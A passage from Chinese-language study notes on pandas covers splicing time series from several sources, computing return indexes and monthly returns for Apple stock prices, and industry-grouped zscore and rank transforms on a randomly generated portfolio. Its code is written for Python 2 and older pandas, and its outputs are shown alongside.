<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">2012-06-01 09:50:00     NaN</span><br><span class="line">2012-06-01 09:51:00     NaN</span><br><span class="line">2012-06-01 09:52:00    22.0</span><br><span class="line">2012-06-01 09:53:00     NaN</span><br><span class="line">2012-06-01 09:54:00     NaN</span><br><span class="line">2012-06-01 09:55:00    25.0</span><br><span class="line">2012-06-01 09:56:00     NaN</span><br><span class="line">2012-06-01 09:57:00     NaN</span><br><span class="line">2012-06-01 09:58:00     NaN</span><br><span class="line">2012-06-01 09:59:00    29.0</span><br><span class="line">2012-06-01 10:00:00     NaN</span><br><span class="line">dtype: float64</span><br><span class="line"></span><br><span class="line">2012-06-01 10:00:00      29.0</span><br><span class="line">2012-06-04 10:00:00     420.0</span><br><span class="line">2012-06-05 10:00:00     809.0</span><br><span class="line">2012-06-06 10:00:00    1200.0</span><br><span class="line">Freq: B, dtype: float64</span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
</ol>
</li>
</ol>
<h3 id="拼接多个数据源"><a href="#拼接多个数据源" class="headerlink" title="拼接多个数据源"></a>拼接多个数据源</h3><ul>
<li>在一个特定的时间点上，从一个数据源切换到另一个数据源</li>
<li>用另一个时间序列对当前时间序列中的缺失值”打补丁”</li>
<li>将数据中的符号(国家 资产代码等)替换成实际数据</li>
</ul>
<ol>
<li><p>在特定时刻从一个时间序列切换到另一个，就是用pandas.concat将两个TimeSeries或DF合并</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">data1 = pd.DataFrame(np.ones((<span class="number">6</span>,<span class="number">3</span>), dtype = float),</span><br><span class="line">                     columns = [<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>],</span><br><span class="line">                     index = pd.date_range(<span class="string">'6/12/2012'</span>, periods = <span class="number">6</span>))</span><br><span class="line"></span><br><span class="line">data2 = pd.DataFrame(np.ones((<span class="number">6</span>,<span class="number">3</span>), dtype = float) * <span class="number">2</span>,</span><br><span class="line">                     columns = [<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>],</span><br><span class="line">                     index = pd.date_range(<span class="string">'6/13/2012'</span>, periods = <span class="number">6</span>))</span><br><span class="line">spliced = pd.concat([data1.ix[:<span class="string">'2012-06-14'</span>], data2.ix[<span class="string">'2012-06-15'</span>:]])</span><br><span class="line"><span class="keyword">print</span> spliced</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#假如data1缺失了data2中存在的某个时间序列</span></span><br><span class="line">data2 = pd.DataFrame(np.ones((<span class="number">6</span>,<span class="number">4</span>), dtype = float) * <span class="number">2</span>,</span><br><span class="line">                     columns = list(<span class="string">'abcd'</span>),</span><br><span class="line">                     index = pd.date_range(<span class="string">'6/13/2012'</span>, periods = <span class="number">6</span>))</span><br><span class="line">spliced = pd.concat([data1.ix[:<span class="string">'2012-06-14'</span>], data2.ix[<span class="string">'2012-06-15'</span>:]])</span><br><span class="line"><span class="keyword">print</span> spliced</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">              a    b    c</span><br><span class="line">2012-06-12  1.0  1.0  1.0</span><br><span class="line">2012-06-13  1.0  1.0  1.0</span><br><span class="line">2012-06-14  1.0  1.0  1.0</span><br><span class="line">2012-06-15  2.0  2.0  2.0</span><br><span class="line">2012-06-16  2.0  2.0  2.0</span><br><span class="line">2012-06-17  2.0  2.0  2.0</span><br><span class="line">2012-06-18  2.0  2.0  2.0</span><br><span class="line"></span><br><span class="line">              a    b    c    d</span><br><span class="line">2012-06-12  1.0  1.0  1.0  NaN</span><br><span class="line">2012-06-13  1.0  1.0  1.0  NaN</span><br><span class="line">2012-06-14  1.0  1.0  1.0  NaN</span><br><span class="line">2012-06-15  2.0  2.0  2.0  2.0</span><br><span class="line">2012-06-16  2.0  2.0  2.0  2.0</span><br><span class="line">2012-06-17  2.0  2.0  2.0  2.0</span><br><span class="line">2012-06-18  2.0  2.0  2.0  2.0</span><br></pre></td></tr></table></figure>
</li>
<li><p>combine~first可以引入合并点之前的数据~，这样就扩展了’d’项的历史</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">spliced_filled = spliced.combine_first(data2)</span><br><span class="line"><span class="keyword">print</span> spliced_filled</span><br><span class="line"></span><br><span class="line"><span class="comment">#如果data2没有关于2012-06-12的数据，所以也就没有值被填充到那一天</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">              a    b    c    d</span><br><span class="line">2012-06-12  1.0  1.0  1.0  NaN</span><br><span class="line">2012-06-13  1.0  1.0  1.0  2.0</span><br><span class="line">2012-06-14  1.0  1.0  1.0  2.0</span><br><span class="line">2012-06-15  2.0  2.0  2.0  2.0</span><br><span class="line">2012-06-16  2.0  2.0  2.0  2.0</span><br><span class="line">2012-06-17  2.0  2.0  2.0  2.0</span><br><span class="line">2012-06-18  2.0  2.0  2.0  2.0</span><br></pre></td></tr></table></figure>
</li>
<li><p>DF也有一个类似的方法update，可以实现就地更新，如果只想填充空洞，必须传入<br>overwrite = False</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">spliced.update(data2, overwrite = <span class="literal">False</span>)</span><br><span class="line"><span class="keyword">print</span> spliced</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#+RESULTS:</span><br><span class="line">:               a    b    c    d</span><br><span class="line">: 2012-06-12  1.0  1.0  1.0  NaN</span><br><span class="line">: 2012-06-13  1.0  1.0  1.0  2.0</span><br><span class="line">: 2012-06-14  1.0  1.0  1.0  2.0</span><br><span class="line">: 2012-06-15  2.0  2.0  2.0  2.0</span><br><span class="line">: 2012-06-16  2.0  2.0  2.0  2.0</span><br><span class="line">: 2012-06-17  2.0  2.0  2.0  2.0</span><br><span class="line">: 2012-06-18  2.0  2.0  2.0  2.0</span><br></pre></td></tr></table></figure>
</li>
<li><p>利用DF的索引机制直接多列进行设置</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cp_spliced = spliced.copy()</span><br><span class="line">cp_spliced[[<span class="string">'a'</span>, <span class="string">'c'</span>]] = data1[[<span class="string">'a'</span>, <span class="string">'c'</span>]]</span><br><span class="line"><span class="keyword">print</span> cp_spliced</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#+RESULTS:</span><br><span class="line">:               a    b    c    d</span><br><span class="line">: 2012-06-12  1.0  1.0  1.0  NaN</span><br><span class="line">: 2012-06-13  1.0  1.0  1.0  2.0</span><br><span class="line">: 2012-06-14  1.0  1.0  1.0  2.0</span><br><span class="line">: 2012-06-15  1.0  2.0  1.0  2.0</span><br><span class="line">: 2012-06-16  1.0  2.0  1.0  2.0</span><br><span class="line">: 2012-06-17  1.0  2.0  1.0  2.0</span><br><span class="line">: 2012-06-18  NaN  2.0  NaN  2.0</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="收益指数和累计收益"><a href="#收益指数和累计收益" class="headerlink" title="收益指数和累计收益"></a>收益指数和累计收益</h3><ol>
<li><p>收益(return)通常是指某资产价格的百分比变化</p>
</li>
<li><p>使用2011到2012年苹果股票价格数据来为例</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas.io.data <span class="keyword">as</span> web</span><br><span class="line"><span class="comment">#price = web.get_data_yahoo('AAPL', '2011-01-01')['Adj Close']</span></span><br><span class="line">price = web.get_data_yahoo(<span class="string">'AAPL'</span>, <span class="string">'2011-01-01'</span>, <span class="string">'2012-07-27'</span>)[<span class="string">'Adj Close'</span>]</span><br><span class="line"><span class="keyword">print</span> price[<span class="number">-5</span>:]</span><br><span class="line"></span><br><span class="line"><span class="comment">#计算两点之间的累计百分比回报，只需计算价格的百分比即可</span></span><br><span class="line"><span class="keyword">print</span> price[<span class="string">'2011-10-03'</span>] / price[<span class="string">'2011-3-01'</span>] - <span class="number">1</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#+RESULTS:</span><br><span class="line">: Date</span><br><span class="line">: 2012-07-23    78.974527</span><br><span class="line">: 2012-07-24    78.593927</span><br><span class="line">: 2012-07-25    75.199948</span><br><span class="line">: 2012-07-26    75.188178</span><br><span class="line">: 2012-07-27    76.532688</span><br><span class="line">: Name: Adj Close, dtype: float64</span><br><span class="line">: 0.0723998875455</span><br></pre></td></tr></table></figure>
</li>
<li><p>计算某只股票上赚了多少，通常都会先计算一个收益指数</p>
<ol>
<li><p>收益指数为一个表示单位投资(比如1美元)收益的时间序列</p>
</li>
<li><p>从收益指数中可以得出很多假设，列如，人们可以决定是否进行利润在投资</p>
</li>
<li><p>可以利用cumprod计算一个简单的收益指数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">returns = price.pct_change() <span class="comment">#转化成百分比</span></span><br><span class="line">ret_index = (<span class="number">1</span> + returns).cumprod()</span><br><span class="line">ret_index[<span class="number">0</span>] = <span class="number">1</span> <span class="comment">#将第一个值设置为1,因为元数据是NAN值</span></span><br><span class="line"><span class="keyword">print</span> ret_index[:<span class="number">5</span>]</span><br><span class="line"><span class="keyword">print</span> ret_index[<span class="number">-5</span>:]</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#计算指定时期内的累积收益</span></span><br><span class="line">m_returns = ret_index.resample(<span class="string">'BM'</span>, how = <span class="string">'last'</span>).pct_change()</span><br><span class="line"><span class="keyword">print</span> m_returns[<span class="string">'2012'</span>]</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#使用重采样聚合(聚合为时期)从日百分比变化中计算</span></span><br><span class="line">m_rets = (<span class="number">1</span> + returns).resample(<span class="string">'M'</span>, how = <span class="string">'prod'</span>, kind = <span class="string">'period'</span>) - <span class="number">1</span></span><br><span class="line"><span class="keyword">print</span> m_rets[<span class="string">'2012'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#如果知道了股息的派发日和支付率，就可以将他们计入每日总收益</span></span><br><span class="line"><span class="comment">#returns[dividend_dates]+= dividend_pcts</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">Date</span><br><span class="line">2011-01-03    1.000000</span><br><span class="line">2011-01-04    1.005219</span><br><span class="line">2011-01-05    1.013442</span><br><span class="line">2011-01-06    1.012622</span><br><span class="line">2011-01-07    1.019874</span><br><span class="line">Name: Adj Close, dtype: float64</span><br><span class="line">Date</span><br><span class="line">2012-07-23    1.832175</span><br><span class="line">2012-07-24    1.823345</span><br><span class="line">2012-07-25    1.744607</span><br><span class="line">2012-07-26    1.744334</span><br><span class="line">2012-07-27    1.775526</span><br><span class="line">Name: Adj Close, dtype: float64</span><br><span class="line"></span><br><span class="line">Date</span><br><span class="line">2012-01-31    0.127111</span><br><span class="line">2012-02-29    0.188311</span><br><span class="line">2012-03-30    0.105283</span><br><span class="line">2012-04-30   -0.025970</span><br><span class="line">2012-05-31   -0.010702</span><br><span class="line">2012-06-29    0.010853</span><br><span class="line">2012-07-31    0.001986</span><br><span class="line">Freq: BM, Name: Adj Close, dtype: float64</span><br><span class="line"></span><br><span class="line">Date</span><br><span class="line">2012-01    0.127111</span><br><span class="line">2012-02    0.188311</span><br><span class="line">2012-03    0.105283</span><br><span class="line">2012-04   -0.025970</span><br><span class="line">2012-05   -0.010702</span><br><span class="line">2012-06    0.010853</span><br><span class="line">2012-07    0.001986</span><br><span class="line">Freq: M, Name: Adj Close, dtype: float64</span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
</ol>
<h2 id="分组变换和分析"><a href="#分组变换和分析" class="headerlink" title="分组变换和分析"></a>分组变换和分析</h2><h3 id="以一组假象的股票投资组合为例"><a href="#以一组假象的股票投资组合为例" class="headerlink" title="以一组假象的股票投资组合为例"></a>以一组假象的股票投资组合为例</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#随机生成1000个股票代码</span></span><br><span class="line"><span class="keyword">import</span> random; random.seed(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">N = <span class="number">1000</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rands</span><span class="params">(n)</span>:</span></span><br><span class="line">    choices = string.ascii_uppercase</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join([random.choice(choices) <span class="keyword">for</span> _ <span class="keyword">in</span> xrange(n)])</span><br><span class="line">tickers = np.array([rands(<span class="number">5</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> xrange(N)])</span><br><span class="line"></span><br><span class="line"><span class="comment">#创建一个含有3列的DF来承载这些假象数据，只选择部分股票组成该投资组合</span></span><br><span class="line">M = <span class="number">500</span></span><br><span class="line">df = pd.DataFrame(&#123;<span class="string">'Momentum'</span>: np.random.randn(M) / <span class="number">200</span> + <span class="number">0.03</span>,</span><br><span class="line">                   <span class="string">'Value'</span>: np.random.randn(M) / <span class="number">200</span> + <span class="number">0.08</span>,</span><br><span class="line">                   <span class="string">'ShortInterest'</span>: np.random.randn(M) / <span class="number">200</span> - <span class="number">0.02</span>&#125;,</span><br><span class="line">                  index = tickers[:M])</span><br><span class="line"></span><br><span class="line"><span class="comment">#为这些股票随机创建一个行业分类</span></span><br><span class="line">ind_names = np.array([<span class="string">'FINANCIAL'</span>, <span class="string">"TECH"</span>])</span><br><span class="line">sampler = np.random.randint(<span class="number">0</span>, len(ind_names), N)</span><br><span class="line">industries = pd.Series(ind_names[sampler], index = tickers, name = <span class="string">'industry'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#根据行业分类进行分组并执行分组聚合和变换</span></span><br><span class="line">by_industry = df.groupby(industries)</span><br><span class="line"><span class="keyword">print</span> by_industry.mean()</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> by_industry.describe()</span><br><span class="line"><span class="keyword">print</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">           Momentum  ShortInterest     Value</span><br><span class="line">industry</span><br><span class="line">FINANCIAL  0.029778      -0.020064  0.080267</span><br><span class="line">TECH       0.030263      -0.020966  0.080098</span><br><span class="line"></span><br><span class="line">                   Momentum  ShortInterest       Value</span><br><span class="line">industry</span><br><span class="line">FINANCIAL count  226.000000     226.000000  226.000000</span><br><span class="line">          mean     0.029778      -0.020064    0.080267</span><br><span class="line">          std      0.005149       0.005331    0.005377</span><br><span class="line">          min      0.019214      -0.032026    0.068041</span><br><span class="line">          25%      0.026270      -0.023680    0.076523</span><br><span class="line">          50%      0.029670      -0.020347    0.079970</span><br><span class="line">          75%      0.032949      -0.016603    0.083983</span><br><span class="line">          max      0.045221      -0.005803    0.094716</span><br><span class="line">TECH      count  274.000000     274.000000  274.000000</span><br><span class="line">          mean     0.030263      -0.020966    0.080098</span><br><span class="line">          std      0.005355       0.004907    0.005124</span><br><span class="line">          min      0.011778      -0.036318    0.067021</span><br><span class="line">          25%      0.026939      -0.024434    0.076484</span><br><span class="line">          50%      0.030419      -0.020622    0.080316</span><br><span class="line">          75%      0.033820      -0.017633    0.083618</span><br><span class="line">          max      0.048204      -0.006882    0.091509</span><br></pre></td></tr></table></figure>
<ol>
<li><p>要对这些按行业分组的投资组合进行各种变换，可以编写自定义的变换函数</p>
</li>
<li><p>列如行业内标准处理，它广泛用于股票资产投资组合的构建过程</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">zscore</span><span class="params">(group)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> (group - group.mean()) / group.std()</span><br><span class="line">df_stand = by_industry.apply(zscore)</span><br><span class="line"><span class="keyword">print</span> df_stand.groupby(industries).agg([<span class="string">'mean'</span>, <span class="string">'std'</span>]) <span class="comment">#处理过后，各行业的平均值为0， 标准差为1</span></span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#内置变换函数(如rank)的用法会更简洁一些</span></span><br><span class="line"><span class="comment"># 行业内降序排名</span></span><br><span class="line">ind_rank = by_industry.rank(ascending = <span class="literal">False</span>)</span><br><span class="line"><span class="keyword">print</span> ind_rank.groupby(industries).agg([<span class="string">'min'</span>, <span class="string">'max'</span>])</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#通过将rank和zscore链接在一起即可完成整个变换过程</span></span><br><span class="line"><span class="comment">#行业内排名和标准化</span></span><br><span class="line"><span class="keyword">print</span> by_industry.apply(<span class="keyword">lambda</span> x : zscore(x.rank()))</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">               Momentum      ShortInterest              Value</span><br><span class="line">                   mean  std          mean  std          mean  std</span><br><span class="line">industry</span><br><span class="line">FINANCIAL  6.047277e-16  1.0  2.853175e-15  1.0 -1.365673e-16  1.0</span><br><span class="line">TECH      -1.950589e-15  1.0  5.267482e-16  1.0  1.656866e-14  1.0</span><br><span class="line"></span><br><span class="line">          Momentum        ShortInterest        Value</span><br><span class="line">               min    max           min    max   min    max</span><br><span class="line">industry</span><br><span class="line">FINANCIAL      1.0  226.0           1.0  226.0   1.0  226.0</span><br><span class="line">TECH           1.0  274.0           1.0  274.0   1.0  274.0</span><br><span class="line"></span><br><span class="line">       Momentum  ShortInterest     Value</span><br><span class="line">VTKGN  0.114706       0.558234  0.481764</span><br><span class="line">KUHMP -1.552350       0.879410 -0.084117</span><br><span class="line">XNHTQ -0.451175      -1.674702 -1.231174</span><br><span class="line">GXZVX  1.001763       0.068823  1.506467</span><br><span class="line">ISXRM  0.527646       0.588822 -0.313529</span><br><span class="line">CLPXZ  1.705290       1.644114 -1.384115</span><br><span class="line">MWGUO -0.170366       0.548957 -0.422760</span><br><span class="line">ASKVR  0.206470       1.460585  0.772351</span><br><span class="line">AMWGI -1.644114       0.344117 -1.429997</span><br><span class="line">WEOGZ -0.485858      -0.233464 -0.738252</span><br><span class="line">ULCIN -1.353526       1.598232 -1.017057</span><br><span class="line">YCOSO  0.927548       0.372281 -0.599436</span><br><span class="line">VOZPP  0.094648      -0.018930 -0.687774</span><br><span class="line">LPKOH -0.894704      -0.818234  1.062939</span><br><span class="line">EEPRM -1.646871      -1.104224 -0.662534</span><br><span class="line">CTWYV -0.599436      -1.003266 -0.460619</span><br><span class="line">XYOKS  0.022941      -0.160588 -0.527646</span><br><span class="line">HVWXP  1.231174       1.659408 -0.282941</span><br><span class="line">YPLRZ  1.066365       1.280899 -1.457575</span><br><span class="line">XUCPM -0.347042      -0.637295 -1.545913</span><br><span class="line">QVGTD -0.971174       1.689996  1.154703</span><br><span class="line">FUIVC -0.145127      -0.309183 -1.078984</span><br><span class="line">DSBOX -0.588822       0.099412 -0.971174</span><br><span class="line">NRAQP  1.521761       0.405293  1.368821</span><br><span class="line">OKJZA  1.338232      -0.879410  0.542940</span><br><span class="line">AYEDF  0.700393      -0.561577  1.243040</span><br><span class="line">UYALC -1.445291      -1.506467 -1.460585</span><br><span class="line">GFQJE  1.292350       0.313529 -0.802939</span><br><span class="line">NBCZF  1.003266       1.520674  1.407096</span><br><span class="line">JTVXE -0.435380      -0.296563 -1.343998</span><br><span class="line">...         ...            ...       ...</span><br><span class="line">XLKXN  1.255660       0.334422 -0.624675</span><br><span class="line">TEBLI -0.619410      -1.628820  1.353526</span><br><span class="line">NIWTJ  0.282941       0.649999  0.497058</span><br><span class="line">DSODA -0.788731      -1.684730 -0.384901</span><br><span class="line">QNOKM  1.205181      -1.571153  1.457575</span><br><span class="line">KCNDR  1.432336       0.410140  1.495434</span><br><span class="line">TEFGP  0.848822       1.001763 -1.277056</span><br><span class="line">KXONF -0.965407       1.306139 -0.574196</span><br><span class="line">CYCDF -0.713013      -0.599436 -0.182986</span><br><span class="line">OQLKQ -0.296563      -0.056789 -0.725633</span><br><span class="line">GUQPA  0.665293      -1.689996 -1.261762</span><br><span class="line">ITFQZ -0.750872       0.750872 -1.432336</span><br><span class="line">LNFAG  0.056789       1.078984 -0.990646</span><br><span class="line">MPVHI  0.498478       1.205181  0.372281</span><br><span class="line">SRSWC  0.940586       0.084117 -0.986468</span><br><span class="line">DMPRF -1.179942      -0.157746 -1.381857</span><br><span class="line">DXGAH  0.344117      -1.613526  0.741763</span><br><span class="line">NQTDN  0.182986      -0.271324 -0.044169</span><br><span class="line">ISJVE  0.082028      -0.170366  1.053745</span><br><span class="line">ZNLSJ  0.466470       1.108821 -1.537055</span><br><span class="line">ALHRN -0.374705      -1.307644 -0.130000</span><br><span class="line">VMEDO -1.571153      -0.069408 -0.813971</span><br><span class="line">GFYDX  0.940168      -1.116843 -0.334422</span><br><span class="line">NYVHM -1.091604      -0.006310 -1.293519</span><br><span class="line">CJYCG -0.573528      -0.864116 -0.894704</span><br><span class="line">BWRPM -0.056789      -1.659490  0.309183</span><br><span class="line">GPSUE -1.047645      -1.644114  1.429997</span><br><span class="line">QRPSN -0.772351      -1.338232 -0.359411</span><br><span class="line">YQQAD  1.318759      -0.574196  1.015886</span><br><span class="line">PTDQE -0.328823      -0.711175  0.955880</span><br><span class="line"></span><br><span class="line">[500 rows x 3 columns]</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="分组因子暴露"><a href="#分组因子暴露" class="headerlink" title="分组因子暴露"></a>分组因子暴露</h3><ol>
<li><p>因子分析(factor analysis)是投资组合定量管理中的一种技术</p>
</li>
<li><p>投资组合的持有量和性能(收益和损失)可以被分解为一个或多个表示投资组合权重的因子(风险因子就是其一)</p>
</li>
<li><p>列如，某只股票的价格与某个基准(比如标准普尔500指数)的协动性被称作贝塔风险系数</p>
</li>
<li><p>下面以一个人为构成的投资组合为例，它由三个随机生成的因子(因子载荷)和一些权重构成</p>
